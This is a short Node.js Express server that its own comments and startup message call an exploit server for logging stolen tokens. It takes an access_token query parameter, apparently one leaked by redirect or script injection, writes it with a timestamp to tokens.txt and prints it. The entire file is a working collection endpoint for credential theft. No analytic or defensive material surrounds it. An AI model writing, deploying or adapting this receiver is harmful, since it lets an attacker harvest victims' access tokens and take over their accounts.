const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');

app.use(express.static(path.join(__dirname, 'public')));

// Log stolen tokens
app.get('/', (req, res) => {
    if (req.query.access_token) {
        const log = `[${new Date().toISOString()}] Token: ${req.query.access_token}\n`;
        fs.appendFileSync('tokens.txt', log);
        console.log(log);
    }
    res.send('Logged!');
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Exploit server running');
});
